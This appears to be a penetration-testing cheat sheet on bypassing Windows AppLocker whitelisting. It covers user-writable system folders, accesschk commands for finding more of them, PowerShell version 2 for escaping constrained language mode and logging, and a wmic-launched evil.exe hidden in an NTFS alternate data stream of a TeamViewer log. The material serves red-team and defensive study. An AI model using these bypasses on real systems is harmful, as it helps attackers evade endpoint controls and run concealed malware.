# AppLocker Bypasses

* This list contains generic methods of bypassing AppLocker.

### Placing files in writeable paths

* The following folders are by default writable by normal users (depends on Windows version - This is from W10 1803)

```
C:\Windows\Tasks 
C:\Windows\Temp 
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```

### Checking for Access&#x20;

* You can check the for additional paths by running accesschk from sysinternals and supplying these commands:

```
accesschk -w -s -q -u Users "C:\Program Files" >> programfiles.txt
accesschk -w -s -q -u Everyone "C:\Program Files" >> programfiles.txt
accesschk -w -s -q -u "Authenticated Users" "C:\Program Files" >> programfiles.txt
accesschk -w -s -q -u Interactive "C:\Program Files" >> programfiles.txt

accesschk -w -s -q -u Users "C:\Program Files (x86)" >> programfilesx86.txt
accesschk -w -s -q -u Everyone "C:\Program Files (x86)" >> programfilesx86.txt
accesschk -w -s -q -u "Authenticated Users" "C:\Program Files (x86)" >> programfilesx86.txt
accesschk -w -s -q -u Interactive "C:\Program Files (x86)" >> programfilesx86.txt

accesschk -w -s -q -u Users "C:\Windows" >> windows.txt
accesschk -w -s -q -u Everyone "C:\Windows" >> windows.txt
accesschk -w -s -q -u "Authenticated Users" "C:\Windows" >> windows.txt
accesschk -w -s -q -u Interactive "C:\Windows" >> windows.txt
```

### User writeable files

* There are cases where files are writeable by the user and can be used to bypass AppLocker. One such known case is 3 files under C:\windows\system32\AppLocker called:
  * `AppCache.dat`
  * `AppCache.dat.LOG1`
  * `AppCache.dat.LOG2`
  * These files are writeable by the first user that logs on to the computer after AppLocker has been deployed to the machine. More details here:
  * [https://oddvar.moe/2019/05/29/a-small-discovery-about-applocker/](https://oddvar.moe/2019/05/29/a-small-discovery-about-applocker/)

### Powershell Version 2

```
Powershell -version 2
```

Bypasses Constrained language mode in PowerShell (and also logging). To fix this Powershell version 2 should be removed from Add/Remove Windows features.

### CMD.exe Bypass&#x20;

* If you are in constrained language mode you can call `cmd.exe` as programs under `System32` are allowed&#x20;

```
cmd.exe /c whoami
```

### NTFS Alternate Data Streams (ADS)

AppLocker rules does not stop things that execute in ADS. More info on that here: [https://hitco.at/blog/howto-prevent-bypassing-applocker-using-alternate-data-streams/](https://hitco.at/blog/howto-prevent-bypassing-applocker-using-alternate-data-streams/) This means you can pipe data to a stream and execute it using many of the different methods: [https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)

Example on adding binary to a writable file under program files (using ADS):

```
type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"

wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'
```

\
[https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)
